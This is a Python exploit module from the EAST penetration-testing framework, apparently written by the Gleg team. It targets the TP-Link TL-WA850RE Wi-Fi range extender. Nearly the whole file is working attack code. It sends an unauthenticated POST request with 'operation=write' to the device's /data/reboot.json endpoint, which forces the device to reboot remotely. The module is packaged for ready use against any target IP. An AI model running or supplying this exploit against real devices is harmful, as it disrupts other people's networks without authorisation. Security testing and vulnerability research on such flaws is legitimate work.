#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
import time

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_tp_link_tl_wa850re_rr"
INFO['DESCRIPTION'] = "TP-Link Technologies TL-WA850RE Wi-Fi Range Extender - Unauthorized Remote Reboot"
INFO['VENDOR'] = "https://www.tp-link.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://packetstormsecurity.com/files/147397/TP-Link-Technologies-TL-WA850RE-Wi-Fi-Range-Extender-Unauthorized-Remote-Reboot.html']
INFO["CVE Name"] = ""
INFO["NOTES"] = """
TP-Link Technologies TL-WA850RE Wi-Fi Range Extender suffers from an unauthorized remote reboot vulnerability.
"""

INFO['CHANGELOG'] = "28 Apr, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
OPTIONS["PORT"] = 80

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/data/reboot.json')
        data = 'operation=write'
        
        request = urllib2.Request(url, data)
        request.add_header('X-Requested-With', 'XMLHttpRequest')
        request.add_header('Accept', 'application/json, text/javascript, */*;')
        request.add_header('Cookie', 'COOKIE=')
        try:
            fd = urllib2.urlopen(request)
            result = fd.read()
        except Exception as e:
            self.log(e)
            self.finish(False)
        self.log('Router is rebooting.')
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
